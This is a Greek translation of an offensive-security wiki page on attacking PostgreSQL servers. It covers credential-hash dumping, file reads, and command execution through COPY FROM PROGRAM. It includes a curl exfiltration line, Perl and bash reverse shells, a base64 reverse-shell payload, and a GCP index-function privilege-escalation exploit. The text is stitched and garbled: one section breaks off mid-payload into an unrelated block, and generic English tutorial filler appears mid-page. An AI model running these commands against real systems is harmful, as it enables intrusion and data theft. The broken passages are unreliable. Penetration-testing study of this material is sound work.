# 5432,5433 - Ελέγχος ασφάλειας PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **Βασικές πληροφορίες**

Το **PostgreSQL** περιγράφεται ως ένα **σύστημα βάσης δεδομένων αντικειμενοστραφές** που είναι **ανοιχτού κώδικα**. Αυτό το σύστημα όχι μόνο χρησιμοποιεί τη γλώσσα SQL, αλλά τη βελτιώνει και με επιπλέον χαρακτηριστικά. Οι δυνατότητές του του επιτρέπουν να χειρίζεται μια ευρεία γκάμα τύπων δεδομένων και λειτουργιών, καθιστώντας το μια ευέλικτη επιλογή για προγραμματιστές και οργανισμούς.

**Προεπιλεγμένη θύρα:** 5432, και εάν αυτή η θύρα είναι ήδη σε χρήση, φαίνεται ότι το postgresql θα χρησιμοποιήσει την επόμενη θύρα (πιθανώς 5433) που δεν χρησιμοποιείται.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Σύνδεση & Βασική Απαρίθμηση

Για να συνδεθείτε σε έναν διακομιστή PostgreSQL, μπορείτε να χρησιμοποιήσετε την εντολή `psql`:

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

Αντικαταστήστε τις `<host>`, `<port>`, `<username>` και `<database>` με τις αντίστοιχες πληροφορίες για τον συγκεκριμένο διακομιστή.

Αφού συνδεθείτε, μπορείτε να εκτελέσετε εντολές SQL για να απαριθμήσετε τις βάσεις δεδομένων, τους πίνακες και τα πεδία. Ορισμένες χρήσιμες εντολές είναι:

- `\l`: Απαριθμεί τις διαθέσιμες βάσεις δεδομένων.
- `\c <database>`: Συνδέεται σε μια συγκεκριμένη βάση δεδομένων.
- `\dt`: Απαριθμεί τους πίνακες στην τρέχουσα βάση δεδομένων.
- `\d <table>`: Προβάλλει πληροφορίες για έναν συγκεκριμένο πίνακα.

Αυτές οι εντολές θα σας βοηθήσουν να αποκτήσετε μια πρώτη εικόνα της δομής της βάσης δεδομένων και των διαθέσιμων πινάκων.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Εάν εκτελέσετε την εντολή **`\list`** και βρείτε μια βάση δεδομένων με το όνομα **`rdsadmin`**, τότε ξέρετε ότι βρίσκεστε μέσα σε μια βάση δεδομένων **AWS PostgreSQL**.
{% endhint %}

Για περισσότερες πληροφορίες σχετικά με το **πώς να καταχραστείτε μια βάση δεδομένων PostgreSQL**, ανατρέξτε στο:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Αυτόματη Απαρίθμηση
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Βίαιη επίθεση**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Σάρωση θυρών**

Σύμφωνα με [**αυτή την έρευνα**](https://www.exploit-db.com/papers/13084), όταν μια προσπάθεια σύνδεσης αποτυγχάνει, το `dblink` εκτοξεύει μια εξαίρεση `sqlclient_unable_to_establish_sqlconnection` περιλαμβάνοντας μια εξήγηση του σφάλματος. Παραδείγματα αυτών των λεπτομερειών παρουσιάζονται παρακάτω.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Ο υπολογιστής είναι εκτός λειτουργίας

`ΛΕΠΤΟΜΕΡΕΙΑ: Δεν ήταν δυνατή η σύνδεση στον διακομιστή: Δεν υπάρχει διαδρομή προς τον κεντρικό υπολογιστή. Εκτελείται ο διακομιστής στον υπολογιστή "1.2.3.4" και δέχεται συνδέσεις TCP/IP στη θύρα 5678;`

* Η θύρα είναι κλειστή
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Ο θύρα είναι ανοιχτή
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ή
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Ο θύρα είναι ανοιχτή ή φιλτραρισμένη
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Στις συναρτήσεις PL/pgSQL, αυτή τη στιγμή δεν είναι δυνατή η λήψη λεπτομερειών για εξαιρέσεις. Ωστόσο, αν έχετε άμεση πρόσβαση στον διακομιστή PostgreSQL, μπορείτε να ανακτήσετε τις απαραίτητες πληροφορίες. Αν η εξαγωγή ονομάτων χρηστών και κωδικών πρόσβασης από τους πίνακες του συστήματος δεν είναι εφικτή, μπορείτε να εξετάσετε τη χρήση της μεθόδου επίθεσης με λίστα λέξεων που συζητήθηκε στην προηγούμενη ενότητα, καθώς αυτό μπορεί να οδηγήσει σε θετικά αποτελέσματα.

## Απαρίθμηση Προνομίων

### Ρόλοι

| Τύποι Ρόλων   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Ο ρόλος έχει προνόμια υπερχρήστη                                                                                                                   |
| rolinherit     | Ο ρόλος κληρονομεί αυτόματα τα προνόμια των ρόλων στους οποίους ανήκει                                                                                 |
| rolcreaterole  | Ο ρόλος μπορεί να δημιουργήσει περισσότερους ρόλους                                                                                                 |
| rolcreatedb    | Ο ρόλος μπορεί να δημιουργήσει βάσεις δεδομένων                                                                                                     |
| rolcanlogin    | Ο ρόλος μπορεί να συνδεθεί. Δηλαδή, αυτός ο ρόλος μπορεί να δοθεί ως αρχικό αναγνωριστικό ταυτοποίησης συνεδρίας                                        |
| rolreplication | Ο ρόλος είναι ρόλος αντιγραφής. Ένας ρόλος αντιγραφής μπορεί να πρωτοστατήσει συνδέσεις αντιγραφής και να δημιουργήσει και να αποθέτει υποδοχές αντιγραφής. |
| rolconnlimit   | Για ρόλους που μπορούν να συνδεθούν, ορίζει τον μέγιστο αριθμό ταυτόχρονων συνδέσεων που μπορεί να πραγματοποιήσει αυτός ο ρόλος. -1 σημαίνει ότι δεν υπάρχει όριο. |
| rolpassword    | Όχι ο κωδικός πρόσβασης (διαβάζεται πάντα ως `********`)                                                                                             |
| rolvaliduntil  | Χρόνος λήξης κωδικού πρόσβασης (χρησιμοποιείται μόνο για την πιστοποίηση με κωδικό πρόσβασης). Κενό αν δεν υπάρχει λήξη.                                |
| rolbypassrls   | Ο ρόλος παρακάμπτει κάθε πολιτική ασφαλείας επιπέδου γραμμής, δείτε [Ενότητα 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) για περισσότερες πληροφορίες. |
| rolconfig      | Προεπιλεγμένες τιμές για μεταβλητές ρύθμισης κατά την εκτέλεση για τον ρόλο                                                                             |
| oid            | ID του ρόλου                                                                                                                                         |

#### Ενδιαφέρουσες Ομάδες

* Αν είστε μέλος του **`pg_execute_server_program`** μπορείτε να **εκτελέσετε** προγράμματα
* Αν είστε μέλος του **`pg_read_server_files`** μπορείτε να **διαβάσετε** αρχεία
* Αν είστε μέλος του **`pg_write_server_files`** μπορείτε να **γράψετε** αρχεία

{% hint style="info" %}
Σημειώστε ότι στο Postgres ένας **χρήστης**, μια **ομάδα** και ένας **ρόλος** είναι το **ίδιο**. Απλά εξαρτάται από τον **τρόπο που το χρησιμοποιείτε** και αν του επιτρέπετε να συνδεθεί.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Πίνακες

Οι πίνακες είναι οργανωμένες δομές δεδομένων που χρησιμοποιούνται για την αποθήκευση και οργάνωση πληροφοριών σε μια βάση δεδομένων PostgreSQL. Κάθε πίνακας αποτελείται από στήλες και γραμμές, όπου κάθε στήλη αντιπροσωπεύει ένα συγκεκριμένο πεδίο δεδομένων και κάθε γραμμή αντιπροσωπεύει ένα εγγραφο.

Για να δημιουργήσετε έναν πίνακα, μπορείτε να χρησιμοποιήσετε την εντολή `CREATE TABLE`. Μπορείτε να καθορίσετε το όνομα του πίνακα, τις στήλες και τους τύπους δεδομένων τους, καθώς και οποιεσδήποτε άλλες παραμέτρους που χρειάζεστε.

Για παράδειγμα, η παρακάτω εντολή δημιουργεί έναν πίνακα με το όνομα "users" που περιέχει τις στήλες "id", "username" και "password":

```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL
);
```

Μπορείτε επίσης να εισαγάγετε δεδομένα στον πίνακα χρησιμοποιώντας την εντολή `INSERT INTO`. Για παράδειγμα, η παρακάτω εντολή εισάγει ένα νέο χρήστη στον πίνακα "users":

```sql
INSERT INTO users (username, password) VALUES ('john', 'password123');
```

Για να ανακτήσετε δεδομένα από έναν πίνακα, μπορείτε να χρησιμοποιήσετε την εντολή `SELECT`. Για παράδειγμα, η παρακάτω εντολή επιστρέφει όλους τους χρήστες από τον πίνακα "users":

```sql
SELECT * FROM users;
```

Αυτές είναι μερικές από τις βασικές εντολές που μπορείτε να χρησιμοποιήσετε για τη διαχείριση πινάκων στο PostgreSQL. Μπορείτε να εξερευνήσετε περισσότερες εντολές και λειτουργίες για την εργασία με πίνακες στην επίσημη τεκμηρίωση του PostgreSQL.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Συναρτήσεις

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be written in various programming languages such as SQL, PL/pgSQL, Python, etc.

#### Creating Functions

To create a function in PostgreSQL, you can use the `CREATE FUNCTION` statement followed by the function name, input parameters (if any), return type, and the code block enclosed in a `BEGIN` and `END` block. Here is the syntax:

```sql
CREATE FUNCTION function_name (parameter1 datatype, parameter2 datatype, ...)
  RETURNS return_type
  LANGUAGE language_name
AS $$
  -- Function code goes here
$$;
```

#### Example

Let's create a simple function that calculates the sum of two numbers:

```sql
CREATE FUNCTION sum_numbers (num1 integer, num2 integer)
  RETURNS integer
AS $$
  DECLARE
    result integer;
  BEGIN
    result := num1 + num2;
    RETURN result;
  END;
$$
LANGUAGE plpgsql;
```

#### Calling Functions

Once a function is created, you can call it by using its name followed by the input parameters (if any). Here is the syntax:

```sql
SELECT function_name(parameter1, parameter2, ...);
```

Using our previous example, we can call the `sum_numbers` function like this:

```sql
SELECT sum_numbers(5, 10);
```

This will return the sum of 5 and 10, which is 15.

#### Conclusion

Functions in PostgreSQL are powerful tools that allow you to encapsulate reusable code and perform specific tasks. By creating functions, you can simplify complex operations and improve the efficiency of your database queries.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Ενέργειες στο σύστημα αρχείων

### Ανάγνωση καταλόγων και αρχείων

Από αυτήν την [**αλλαγή**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) τα μέλη της ομάδας **`DEFAULT_ROLE_READ_SERVER_FILES`** (που ονομάζεται **`pg_read_server_files`**) και οι **υπερχρήστες** μπορούν να χρησιμοποιήσουν τη μέθοδο **`COPY`** σε οποιοδήποτε διαδρομή (ελέγξτε την `convert_and_check_filename` στο `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Να θυμάστε ότι αν δεν είστε υπερχρήστης αλλά έχετε δικαιώματα **CREATEROLE**, μπορείτε **να γίνετε μέλος αυτής της ομάδας:**
```sql
GRANT pg_read_server_files TO username;
```
[**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Υπάρχουν **άλλες συναρτήσεις του postgres** που μπορούν να χρησιμοποιηθούν για να **διαβάσουν αρχεία ή να εμφανίσουν το περιεχόμενο ενός φακέλου**. Μόνο **υπερχρήστες** και **χρήστες με ρητές άδειες** μπορούν να τις χρησιμοποιήσουν:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Μπορείτε να βρείτε **περισσότερες λειτουργίες** στο [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Απλή εγγραφή αρχείου

Μόνο **υπερχρήστες** και μέλη του **`pg_write_server_files`** μπορούν να χρησιμοποιήσουν την εντολή copy για να εγγράψουν αρχεία.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Να θυμάστε ότι αν δεν είστε υπερχρήστης αλλά έχετε τα δικαιώματα **`CREATEROLE`**, μπορείτε να **γίνετε μέλος αυτής της ομάδας:**
```sql
GRANT pg_write_server_files TO username;
```
[**Περισσότερες πληροφορίες**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Θυμηθείτε ότι το COPY δεν μπορεί να χειριστεί χαρακτήρες νέας γραμμής, επομένως ακόμα κι αν χρησιμοποιείτε ένα payload base64 **πρέπει να στείλετε ένα μονογραμμικό κείμενο**.\
Ένα πολύ σημαντικό περιορισμός αυτής της τεχνικής είναι ότι **το `copy` δεν μπορεί να χρησιμοποιηθεί για την εγγραφή δυαδικών αρχείων καθώς τροποποιεί ορισμένες δυαδικές τιμές**.

### **Μεταφόρτωση δυαδικών αρχείων**

Ωστόσο, υπάρχουν **άλλες τεχνικές για τη μεταφόρτωση μεγάλων δυαδικών αρχείων:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Συμβουλή για bug bounty**: **εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty που δημιουργήθηκε από χάκερς, για χάκερς**! Γίνετε μέλος σήμερα στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE σε πρόγραμμα**

Από την έκδοση [9.3](https://www.postgresql.org/docs/9.3/release-9-3.html) και μετά, μόνο **υπερχρήστες** και μέλη της ομάδας **`pg_execute_server_program`** μπορούν να χρησιμοποιήσουν το copy για RCE (παράδειγμα με εξαγωγή:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Παράδειγμα εκτέλεσης:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Να θυμάστε ότι αν δεν είστε υπερχρήστης αλλά έχετε τα δικαιώματα **`CREATEROLE`**, μπορείτε **να γίνετε μέλος αυτής της ομάδας:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Περισσότερες πληροφορίες**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ή χρησιμοποιήστε το `multi/postgres/postgres_copy_from_program_cmd_exec` module από το **metasploit**.\
Περισσότερες πληροφορίες για αυτή την ευπάθεια [**εδώ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Ενώ αναφέρεται ως CVE-2019-9193, η Postges δήλωσε ότι αυτό ήταν ένα [χαρακτηριστικό και δεν θα διορθωθεί](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE με γλώσσες PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE με επεκτάσεις PostgreSQL

Αφού έχετε **μάθει** από την προηγούμενη ανάρτηση **πώς να μεταφορτώσετε δυαδικά αρχεία**, μπορείτε να δοκιμάσετε να αποκτήσετε **RCE με τη μεταφόρτωση μιας επέκτασης postgresql και τη φόρτωσή της**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE με το αρχείο ρύθμισης του PostgreSQL

Το **αρχείο ρύθμισης** του postgresql είναι **εγγράψιμο** από τον **χρήστη postgres**, ο οποίος είναι αυτός που εκτελεί τη βάση δεδομένων, οπότε ως **υπερχρήστης** μπορείτε να γράψετε αρχεία στο σύστημα αρχείων και, συνεπώς, μπορείτε να **αντικαταστήσετε αυτό το αρχείο**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE με ssl\_passphrase\_command**

Περισσότερες πληροφορίες [για αυτήν την τεχνική εδώ](https://pulsesecurity.co.nz/articles/postgres-sqli).

Το αρχείο ρύθμισης έχει ορισμένα ενδιαφέροντα χαρακτηριστικά που μπορούν να οδηγήσουν σε RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Διαδρομή προς το ιδιωτικό κλειδί της βάσης δεδομένων
* `ssl_passphrase_command = ''` Εάν το ιδιωτικό αρχείο προστατεύεται με κωδικό πρόσβασης (κρυπτογραφημένο), η postgresql θα **εκτελέσει την εντολή που υποδεικνύεται σε αυτό το χαρακτηριστικό**.
* `ssl_passphrase_command_supports_reload = off` **Εάν** αυτό το χαρακτηριστικό είναι **ενεργοποιημένο**, η **εντολή** που εκτελείται εάν το κλειδί προστατεύεται με κωδικό πρόσβασης **θα εκτελεστεί** όταν εκτελείται η `pg_reload_conf()`.

Έπειτα, ένας επιτιθέμενος θα πρέπει να:

1. **Αντλήσει το ιδιωτικό κλειδί** από τον διακομιστή
2. **Κρυπτογραφήσει** το κατεβασμένο ιδιωτικό κλειδί:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Αντικαταστήσει**
4. **Αντλήσει** την τρέχουσα **ρύθμιση** του postgresql
5. **Αντικαταστήσει** τη **ρύθμιση** με την παραπάνω ρύθμιση των χαρακτηριστικών:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Εκτέλεση της `pg_reload_conf()`

Κατά τη δοκιμή αυτού παρατήρησα ότι αυτό θα λειτουργήσει μόνο εάν το **αρχείο ιδιωτικού κλειδιού έχει δικαιώματα 640**, ανήκει στον **root** και στη **συμμετοχή ssl-cert ή postgres** (ώστε ο χρήστης postgres να μπορεί να το διαβάσει) και βρίσκεται στο _/var/lib/postgresql/12/main_.

#### **RCE με archive\_command**

**Περισσότερες** [**πληροφορίες για αυτήν τη ρύθμιση και για το WAL εδώ**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Ένα άλλο χαρακτηριστικό στο αρχείο ρύθμισης που μπορεί να εκμεταλλευτεί είναι το `archive_command`.

Για να λειτουργήσει αυτό, η ρύθμιση `archive_mode` πρέπει να είναι `'on'` ή `'always'`. Εάν αυτό ισχύει, τότε μπορούμε να αντικαταστήσουμε την εντολή στο `archive_command` και να την εκτελέσουμε μέσω των λειτουργιών WAL (write-ahead logging).

Οι γενικές ακολουθούμενες ενέργειες είναι:

1. Ελέγξτε εάν η λειτουργία αρχειοθέτησης είναι ενεργοποιημένη: `SELECT current_setting('archive_mode')`
2. Αντικαταστήστε το `archive_command` με το payload. Για παράδειγμα, ένα αντίστροφο κέλυφος: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNURE
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Τροποποίηση Κωδικού Πρόσβασης

Οι χρήστες με αυτόν τον ρόλο μπορούν επίσης να **τροποποιήσουν** τους **κωδικούς πρόσβασης** άλλων **μη-υπερχρήστών**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Ανέβασμα δικαιωμάτων σε SUPERUSER

Συχνά συμβαίνει να ανακαλύπτετε ότι **οι τοπικοί χρήστες μπορούν να συνδεθούν στο PostgreSQL χωρίς να παρέχουν κωδικό πρόσβασης**. Επομένως, αφού έχετε συγκεντρώσει **δικαιώματα για εκτέλεση κώδικα**, μπορείτε να καταχραστείτε αυτά τα δικαιώματα για να αποκτήσετε τον ρόλο του **`SUPERUSER`**.
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Αυτό είναι συνήθως δυνατό λόγω των παρακάτω γραμμών στο αρχείο **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ΑΛΛΑΓΗ ΠΙΝΑΚΑ privesc**

Στο [**συγκεκριμένο άρθρο**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) εξηγείται πώς ήταν δυνατό να γίνει **privesc** στο Postgres GCP καταχρώντας το προνόμιο ALTER TABLE που είχε δοθεί στον χρήστη.

Όταν προσπαθείτε να **καταστήσετε άλλον χρήστη ιδιοκτήτη ενός πίνακα**, θα πρέπει να λάβετε ένα **σφάλμα** που το αποτρέπει, αλλά φαίνεται ότι η GCP έδωσε αυτήν την **επιλογή** στον μη-υπερχρήστη postgres στο GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Συνδυάζοντας αυτήν την ιδέα με το γεγονός ότι όταν εκτελούνται οι εντολές **INSERT/UPDATE/ANALYZE** σε έναν πίνακα με μια συνάρτηση δείκτη, η **συνάρτηση** καλείται ως μέρος της εντολής με τα δικαιώματα του ιδιοκτήτη του πίνακα. Είναι δυνατό να δημιουργηθεί ένας δείκτης με μια συνάρτηση και να δοθούν δικαιώματα ιδιοκτήτη σε έναν **υπερχρήστη** για αυτόν τον πίνακα, και στη συνέχεια να εκτελεστεί το ANALYZE στον πίνακα με την κακόβουλη συνάρτηση που θα μπορεί να εκτελέσει εντολές επειδή χρησιμοποιεί τα δικαιώματα του ιδιοκτήτη.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Εκμετάλλευση

1. Ξεκινήστε δημιουργώντας έναν νέο πίνακα.
2. Εισάγετε μερικό άσχετο περιεχόμενο στον πίνακα για να παρέχετε δεδομένα για τη λειτουργία του ευρετηρίου.
3. Αναπτύξτε μια κακόβουλη λειτουργία ευρετηρίου που περιέχει ένα φορτίο εκτέλεσης κώδικα, επιτρέποντας την εκτέλεση μη εξουσιοδοτημένων εντολών.
4. Αλλάξτε τον ιδιοκτήτη του πίνακα σε "cloudsqladmin", που είναι ο υπερχρήστης ρόλος του GCP που χρησιμοποιείται αποκλειστικά από το Cloud SQL για τη διαχείριση και συντήρηση της βάσης δεδομένων.
5. Εκτελέστε μια λειτουργία ANALYZE στον πίνακα. Αυτή η ενέργεια αναγκάζει τη μηχανή PostgreSQL να μεταβεί στο περιβάλλον χρήστη του ιδιοκτήτη του πίνακα, "cloudsqladmin". Ως αποτέλεσμα, η κακόβουλη λειτουργία ευρετηρίου καλείται με τα δικαιώματα του "cloudsqladmin", επιτρέποντας έτσι την εκτέλεση της προηγουμένως μη εξουσιοδοτημένης εντολής κέλυφους.

Στο PostgreSQL, αυτή η διαδικασία φαίνεται κάπως έτσι:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

